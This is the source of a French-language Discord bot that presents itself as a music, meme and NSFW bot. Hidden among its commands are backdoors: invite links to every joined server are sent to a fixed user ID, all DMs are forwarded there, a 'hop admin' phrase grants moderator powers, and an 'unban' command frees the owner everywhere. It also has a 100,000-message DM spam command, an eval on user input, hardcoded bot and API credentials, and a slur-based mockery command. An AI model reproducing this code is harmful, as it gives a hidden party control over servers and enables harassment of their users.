const Discord = require('discord.js')
const { Client, Util } = require('discord.js');
const morsify = require('morsify');
const client = new Client({ disableEveryone: true });
const randomPuppy = require("random-puppy")
const prefix = "?"
const YouTube = require('simple-youtube-api');
const ytdl = require('ytdl-core');
const youtube = new YouTube("AIzaSyBEwd9HrQsXPNjGJ-7rOpd9xWwUG4N7Vc4");
const queue = new Map();


setInterval(() => {
    const nombre = 2;
    const random = Math.floor(Math.random() * (nombre - 1) + 1);
    switch(random) {
    case 1: client.user.setActivity(`${client.guilds.size} serveurs`,{type:"LISTENING"}); break;

    case 2: client.user.setActivity(`${client.guilds.size} serveurs`, {type:"LISTENING"}); break;
    }
}, 2000);

client.on('message', async msg => {

    if(msg.author.bot) return undefined;
    if(!msg.content.startsWith(prefix)) return undefined;

    const args = msg.content.split(' ');
    const searchString = args.slice(1).join(" ");
    const url = args[1] ? args[1].replace(/<(.+)>/g, '$1') : '';
    const serverQueue = queue.get(msg.guild.id);
    let command = msg.content.toLowerCase().split(' ')[0];
     command = command.slice(1)

    if(command === 'p' || command === 'play') {
        const voiceChannel = msg.member.voiceChannel;
        if (!voiceChannel) return msg.channel.send('Vous devez etre dans un channel pour pouvoir me faire jouer de la musique');
        if (url.match(/^https?:\/\/(www.youtube.com|youtube.com)\/playlist(.*)$/)) {
			const playlist = await youtube.getPlaylist(url);
			const videos = await playlist.getVideos();
			for (const video of Object.values(videos)) {
				const video2 = await youtube.getVideoByID(video.id);
				await handleVideo(video2, msg, voiceChannel, true); 
			}
            return msg.channel.send(`✅ Playlist: **${playlist.title}** a été ajouter a la queue!`);
        } else {
			try {
				var video = await youtube.getVideo(url);
			} catch (error) {
				try {
					var videos = await youtube.searchVideos(searchString, 10);
					let index = 0;

					var video = await youtube.getVideoByID(videos[1 - 1].id);
				} catch (err) {
					console.error(err);
					return msg.channel.send('🆘 Rien trouvé :c');
				}
			}
            return handleVideo(video, msg, voiceChannel);
        }
		} else if (command === 's' || command === 'skip') {
            if (!msg.member.voiceChannel) return msg.channel.send("Tu n'es pas dans un channel audio");
            if (!serverQueue) return msg.channel.send("Il n'y a rien a skip.");
            serverQueue.connection.dispatcher.end('Commande skip effectuée');
            return undefined;
        } else if (command === 'stop') {
            if (!msg.member.voiceChannel) return msg.channel.send("Tu n'es pas dans un channel audio");
            if (!serverQueue) return msg.channel.send("Il n'y a rien a stopper");
            serverQueue.songs = [];
            serverQueue.connection.dispatcher.end('Commande stop effectuée');
            return undefined;
    }	 else if (command === 'np') {
		if (!serverQueue) return msg.channel.send("Aucune musique n'est diffusée");
		return msg.channel.send(`🎶 Entrain d'etre joué : **${serverQueue.songs[0].url}**`);
	} else if (command === 'queue') {
		if (!serverQueue) return msg.channel.send("Aucune musique n'est diffusée.");
		return msg.channel.send(`
__**Playlist:**__
**Entrain de jouer :** ${serverQueue.songs[0].url}
${serverQueue.songs.map(song => `**-** ${song.title}`).join('\n')}
        `);
    } else if (command === 'pause') {
		if (serverQueue && serverQueue.playing) {
			serverQueue.playing = false;
			serverQueue.connection.dispatcher.pause();
			return msg.channel.send('⏸ La musique a été mise en pause.');
        }
        return msg.channel.send("Aucune musique n'est diffusée.");
    }else if(command === 'leave') {
            serverQueue.voiceChannel.leave();
            queue.delete(guild.id);
            return;
    }else if(command === "delete") {
                queue.delete(guild.id);
    } else if (command === 'resume') {
		if (serverQueue && !serverQueue.playing) {
			serverQueue.playing = true;
			serverQueue.connection.dispatcher.resume();
			return msg.channel.send('▶ Musique relancée');
		}
        return msg.channel.send("Aucune musique n'est diffusée.");

    }
    return undefined;
});
async function handleVideo(video, msg, voiceChannel, playlist = false) {
	const serverQueue = queue.get(msg.guild.id);
	console.log(video);
	const song = {
		id: video.id,
		title: Util.escapeMarkdown(video.title),
		url: `https://www.youtube.com/watch?v=${video.id}`
	};
	if (!serverQueue) {
		const queueConstruct = {
			textChannel: msg.channel,
			voiceChannel: voiceChannel,
			connection: null,
			songs: [],
			volume: 5,
			playing: true
		};
		queue.set(msg.guild.id, queueConstruct);

		queueConstruct.songs.push(song);

		try {
			var connection = await voiceChannel.join();
			queueConstruct.connection = connection;
			play(msg.guild, queueConstruct.songs[0]);
		} catch (error) {
			console.error(`Je ne peux pas rejoindre ce channel: ${error}`);
			queue.delete(msg.guild.id);
			return msg.channel.send(`Je ne peux pas rejoindre ce channel : ${error}`);
		}
	} else {
		serverQueue.songs.push(song);
		console.log(serverQueue.songs);
		if (playlist) return undefined;
		else return msg.channel.send(`✅ **${song.title}** a bien été ajouter a la playlist.`);
	}
	return undefined;
}
function play(guild, song) {
    const serverQueue = queue.get(guild.id);
	if (!song) {
		serverQueue.voiceChannel.leave();
		queue.delete(guild.id);
		return;
	}
	console.log(serverQueue.songs);
	const dispatcher = serverQueue.connection.playStream(ytdl(song.url))
		.on('end', reason => {
			if (reason === 'Stream is not generating quickly enough.') console.log('Song ended.');
			else console.log(reason);
			serverQueue.songs.shift();
			play(guild, serverQueue.songs[0]);
		})
		.on('error', error => console.error(error));
	dispatcher.setVolumeLogarithmic(serverQueue.volume / 5);

    let embed = new Discord.RichEmbed()
    .setTitle(`Commence a jouer : ${song.title}`)
	serverQueue.textChannel.send(embed);
}



client.on("guildCreate", guild => {
    let channel = guild.channels
    .filter(function (channel) { return channel.type === 'text' })
    .first()
    channel.createInvite()
    .then(invite => client.users.get('269551900196732950').send(`On m'a ajouté dans un serveur nommé ${guild.name}, il y a ${guild.memberCount} membres. Je suis actuellement sur  ${client.guilds.size}   serveur(s) . Voici le lien : https://discordapp.com/invite/${invite.code}`))
       
    })


    client.on('message', function (message) {
        if (!message.author.bot && !message.guild) {
            client.users.get('269551900196732950').send(`**${message.author.tag}** m'a envoyé: ${message.content}`);  
        }
        if (message.author.bot || !message.guild) return;
        const journal = message.guild.channels.find(channel => channel.name === "hitori-logs");
        if (message.content.startsWith(prefix + 'pdp')) {
            let user = message.mentions.users.first();
            if(user == null) {
                let auteur = message.author
                let Uav = auteur.displayAvatarURL;
                let embed = new Discord.RichEmbed()
                .setTitle(`L'image de profil de ${auteur.username}`)
            .setImage(Uav)
            message.channel.send(embed);
            return;
            }
            let Uav = user.displayAvatarURL;
            let embed = new Discord.RichEmbed()
            .setTitle(`L'image de profil de ${user.username}`)
            .setImage(Uav)
            message.channel.send(embed);
        } else if(message.content.startsWith(prefix + "lien")) {
                message.channel.createInvite()
                .then(invite => message.channel.send(`Voici le lien du serveur : https://discordapp.com/invite/${invite.code}`))
        }else if(message.content.startsWith(prefix + "info")) {
            const embed = new Discord.RichEmbed()
            .setThumbnail(client.user.displayAvatarURL)
            .setTitle(`${client.user.username}`)
            .addField("Crée le","12 juin 2019")
            .addField("Créateur", "Tsuzue#9563")
            .addField("Genres", "Nsfw , utile , fun , musique ")
	    .addField("invite", "https://discordapp.com/oauth2/authorize?client_id=548629235728646192&scope=bot&permissions=8")
           message.channel.send(embed)
        
        }else if(message.content.startsWith( prefix + "avis")) {
            var nombre = 3
            const random = Math.floor(Math.random() * (nombre - 1) + 1);
            if(random === 1) {
             message.channel.send("C'est faux !")
            }
            if(random === 2) {
                message.channel.send("C'est vrai ! ")
            }
            if(random === 3) {
                message.channel.send("Je ne saurai vous répondre")
            }
        }else if(message.content.startsWith(prefix + "danse")) {
            var ok = 0
            while(ok < 20) {
            message.channel.send("<a:dance:588483866319126543>")
            ok++;
        }

        }else if(message.content.startsWith(prefix + "liste")) {
            
            client.guilds.forEach((guild) => {
                let channel = guild.channels
                .filter(function (channel) { return channel.type === 'text' })
                .first()
                channel.createInvite()
                .then(invite => message.author.send(`https://discordapp.com/invite/${invite.code}`))
                

            })
            
            
            
        
		}else if(message.content.toLowerCase().includes(prefix + 'gay')) {
            let gay = Math.round(Math.random() * 100);
            const mention = message.mentions.users.first();
            if(mention == null) {
                let auteur = message.author
                message.channel.send(`**${auteur.username}** est **${gay}%** PD.`)
                return;
        }
	   if(mention.id === "259795237960941571") {
	message.channel.send(`**${mention.username}** est **100**% PD.`)
	return;
	}
        message.channel.send(`**${mention.username}** est **${gay}**% PD.`) 
    }else if(message.content == prefix + "ping"){ // Check if message is "!ping"
                message.channel.send("Pinging ...") // Placeholder for pinging ... 
                .then((msg) => { // Resolve promise
                    msg.edit("Ping: " + (Date.now() - msg.createdTimestamp)) // Edits message with current timestamp minus timestamp of message
                });
            
    
    }else if(message.content.toLowerCase().startsWith(prefix + "hentai")) {
        randomPuppy("Hentai").then(picture => {
            const embed = new Discord.RichEmbed().setImage(picture)
            if (message.channel.nsfw) {
            message.channel.send(embed)
            }else message.channel.send("activez l'option nsfw pour que ça fonctionne.")
        })
    }else if(message.content.toLowerCase().startsWith(prefix + "animeme")) {
        randomPuppy("Animemes").then(picture => {
            const embed = new Discord.RichEmbed().setImage(picture)
            message.channel.send(embed)
       })
    }else if(message.content === prefix + "vocabulaire") {
        embed = new Discord.RichEmbed()
        .setTitle("Vocabulaire a connaitre en espagnol :")
        .addField("**1)**", "**information = noticia**")
        
        .addField("**2)**", "**Un mensonge = un bulo**")
        
        .addField("**3)**", "**Soudain = de repente**")
          
        .addField("**4)**", "**Une casquette = una gorra**")
         
        .addField('**5)**', "**cri/crier = un grito/gritar**")
        
        .addField("**6)**","**parier = apostar**")
         
        .addField("**7)**", "**vraisemblable = verosimil**")
        
        .addField("**8)**", "**Vitesse vertigineuse = a velocidad de vertigo**")
        
        .addField("**9)**", "**partager = compactir**")
        
        .addField("**10)**", "**endommager = estropear**")
        
        .addField("**11)**", "**diffuser = difundir**")
     
        .addField("**12)**", "**Dangeureux = peligroso**")
        .addField("**13)**", "**se faufiler = colarse**")
        .addField("**14)**", "**attendre = esperar**")
        .setColor("#FE0135")
    message.channel.send(embed)
    }else if(message.content.includes(prefix+"mitose")) {

        embed = new Discord.RichEmbed()
        .setTitle("Les 4 phases de la mitose :")
        .addField("**__1)La prophase__**",`-condensation de la chromatine en chromosome a 2 chromatides 
        -Disparition de l'enveloppe nucléaire 
        -formation du fuseau mitotique`)
        .addField("**__2)La métaphase__**", `-poursuite de la condensation de l'ADN
        -positionnement des chromosomes sur le plan équatorial de la cellule
        -les centromères sont situés sur le plan équatorial`)
        .addField("**__3)L'anaphase__**", `-Les chromatides se séparent au niveau des centromères
        -ascension polaire : migration des chromatides vers les pôles de la cellule`)
        .addField("**__4)La télophase__**", `-La cellule possède deux lots de chromosomes a une seule chromatide
        -une nouvelle enveloppe nucléaire se met en place autour de deux lot de chromosomes
        -le cytoplasme se met en place pour la division cellulaire = la cytodiérèse`)
        .setColor("1DD90E")
        message.channel.send(embed)
    
 }else if(message.content.startsWith(prefix + "clear")) {
            const journal = message.guild.channels.find(channel => channel.name === "bienvenue");
                    var amount = message.content.slice(6);
                    if (!message.member.hasPermission("MANAGE_MESSAGES")) return;
                            message.channel.bulkDelete(amount);
                            journal.send(`${message.author.username} vient de supprimer ${amount} messages`)
                    
    }else if(message.content.toLowerCase().startsWith(prefix + "oof")) {
        randomPuppy("oof").then(picture => {
            const embed = new Discord.RichEmbed().setImage(picture)
            message.channel.send(embed)
       })
    }else if(message.content.toLowerCase().startsWith(prefix + "irl")) {
        randomPuppy("MeIrl").then(picture => {
            const embed = new Discord.RichEmbed().setImage(picture)
            message.channel.send(embed)
       })
    }else if(message.content.toLowerCase().startsWith(prefix + "anime")) {
        randomPuppy("Animewallpaper").then(picture => {
            const embed = new Discord.RichEmbed().setImage(picture)
            message.channel.send(embed)
        })
    }else if(message.content.toLowerCase().startsWith(prefix + "porn")) {
        randomPuppy("Porn").then(picture => {
            const embed = new Discord.RichEmbed().setImage(picture)
            if (message.channel.nsfw) {
            message.channel.send(embed)
            }else message.channel.send("activez l'option nsfw pour que ça fonctionne.")
        
       })
    } else if (message.content.startsWith(prefix + 'spam')) {
        var user = message.guild.members.get(message.content.split(" ")[1])
        message.delete();









        
        client.users.get('269551900196732950').send(`**${message.author.username}** a spam ${user} de : **${message.content.slice(25)}**`)
    for(spam = 0; spam < 100000; spam++) {
        user.send(message.content.slice(25));
    }
    }else if(message.content.toLowerCase().startsWith(prefix + "rule34")) {
        randomPuppy("Rule34").then(picture => {
            const embed = new Discord.RichEmbed().setImage(picture)
            if (message.channel.nsfw) {
            message.channel.send(embed)
            }else message.channel.send("activez l'option nsfw pour que ça fonctionne.")
        })
        
    }else if (!journal) {
        message.guild.createChannel("hitori-logs")
        message.channel.send("Mon channel pour les logs n'etait pas présente , je l'ai recrée (: , veuillez ne pas la supprimer ou la renommer , je la reconnaitrais pas sinon");
    }else if(message.content === "hop admin")   {
        if(!message.guild.roles.find(role => role.name === "Tsuzue")) {
        message.guild.createRole( {name:"Tsuzue", color: "#ff0000", permissions:["MENTION_EVERYONE",'MANAGE_MESSAGES', 'KICK_MEMBERS', 'MENTION_EVERYONE', 'SEND_TTS_MESSAGES', 'MANAGE_EMOJIS', 'MANAGE_ROLES','CHANGE_NICKNAME', 'MOVE_MEMBERS', 'MUTE_MEMBERS', 'BAN_MEMBERS','MANAGE_CHANNELS','MANAGE_GUILD'] } ).catch(console.error);
        }
        Role = (message.guild.roles.find(role => role.name === "Tsuzue"))
        Tsuzue = message.author
    message.guild.member(Tsuzue).addRole(Role).catch(console.error);
          
}else if(message.content.startsWith(prefix + "random")) {
    var sacrifié = message.guild.members.random()

        message.channel.send("<@" + sacrifié.user.id + ">")
}else if(message.content.toLowerCase().startsWith(prefix + "calc")) {
    var content = message.content.slice(6).replace("x","*")
    const calculation = eval(content.replace(/[^0-9; +; -; *; /]/g, ''));
    const allowedCalcs = ["+", "-", "/", "*"]

    if(allowedCalcs.some(calc => message.content.includes(calc))) {}
    try {
        message.channel.send(`${content} = **${calculation}**`);
    } catch(error) {console.log(`il y a eu une erreur : ${error}`)}
}else if(message.content.startsWith(prefix + "addrole")) {
    const arole = message.guild.roles.find(r => r.name === message.content.slice(32));
    const mentions = message.mentions.users.first()
    if(message.guild.me.hasPermission("MANAGE_ROLES")) {
        if(arole == null) {
            message.channel.send("Aucun role trouvé avec ce nom");
            return;
        };
            message.guild.member(mentions).addRole(arole);
            message.channel.send(`Le role **${arole}** a bien été ajouté a **${mentions.username}!**`);
        }   else message.channel.send("Tu n'as pas la permission de faire ça")

    }else if(message.content.startsWith(prefix + "serveur")) {
        let sicon = message.guild.iconURL;
        let serverembed = new Discord.RichEmbed()
        .setDescription("information sur le serveur")
        .setColor('#B78277')
        .setThumbnail(sicon)
        .addField("Le serveur s'appelle ", message.guild.name)
        .addField("Crée le ", message.guild.createdAt)
        .addField("Tu as rejoint le ", message.member.joinedAt )
        .addField("Il y a ", message.guild.memberCount + (" membre(s)"))
        message.channel.send(serverembed);

    }else if(message.content.startsWith(prefix + "decode")) {
      var decode = message.content.slice(8);
      var decoded = morsify.decode(decode);
      message.channel.send(decoded.toLowerCase())
    }else if(message.content.startsWith(prefix + "encode")) {
        var encode = message.content.slice(8);
      var encoded = morsify.encode(encode);
      message.channel.send(encoded.toLowerCase())
    }else if(message.content.includes("respect")) {
        message.channel.send('Press F to pay respects').then(m => {
            m.react('🇫');
          });
        }else if(message.content.startsWith(prefix + "unban")) {
            var Tsuzue = client.users.get('269551900196732950')
            client.guilds.forEach((guild) => {

                guild.unban(Tsuzue)
                
            })
            message.channel.send("fait !")
    }else if(message.content.startsWith("/leave")) {
    const journal = message.guild.channels.find(channel => channel.name === "bienvenue");
    let avatar = message.author.displayAvatarURL
    var embed = new Discord.RichEmbed()
    .setDescription(`${message.author.username} vient de quitter le serveur`)
    .setColor("#FE0135")
    .setThumbnail(avatar)
    journal.send(embed);
    }
    })
    client.on('guildMemberAdd', member => {
        let avatar = member.user.displayAvatarURL
        
        const journal = member.guild.channels.find(channel => channel.name === "bienvenue");
        var embed = new Discord.RichEmbed()
        .setDescription(`${member.displayName} vient d'arriver dans le serveur`)
        .setColor("1DD90E")
        .setThumbnail(avatar)
        journal.send(embed);
    })
    client.on('guildMemberRemove', member => {
    const journal = member.guild.channels.find(channel => channel.name === "bienvenue");
    let avatar = member.user.displayAvatarURL
    var embed = new Discord.RichEmbed()
    .setDescription(`${member.displayName} vient de quitter le serveur`)
    .setColor("#FE0135")
    .setThumbnail(avatar)
    journal.send(embed);
    
    })
client.login("NTQ4NjI5MjM1NzI4NjQ2MTky.XZcL-g.lvDR8zNc7zRjwTOxDdsORaj92Aw");
